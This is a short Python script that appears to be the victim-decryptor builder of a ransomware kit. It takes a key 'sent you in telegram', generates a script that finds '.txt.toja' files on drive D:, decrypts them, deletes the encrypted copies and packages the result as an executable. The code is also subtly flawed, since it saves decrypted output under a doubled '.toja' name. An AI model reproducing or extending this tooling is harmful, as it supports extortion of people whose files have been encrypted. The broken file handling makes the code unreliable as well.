from cryptography.fernet import Fernet
import os
from subprocess import check_output
from colorama import Fore

key = input(Fore.GREEN+"\n [*] Enter the key sent you in telegram : ")


path = ('''
from cryptography.fernet import Fernet
import os
from subprocess import check_output

de = Fernet(%s)

cmd = check_output("D: && dir /S /B *.txt.toja",shell=True).decode().split()

for i in cmd:
    with open(i,'rb') as f:
        p = f.read()
        m = de.decrypt(p)
        with open(i+".toja",'wb') as u:
            u.write(m)
        u.close()
        f.close()
        os.remove(i)

'''%(key))


f = open("../The File In This Folder For Decrypt/base.py",'w')
f.write(path)
f.close()
print(Fore.LIGHTMAGENTA_EX+" [!] Please Wait For Build Exe File ! ")
os.system("pyinstaller --onefile base.py")
print(Fore.GREEN+" [+] Your Exe File Build Successfully!Go To /Dist Folder ! ")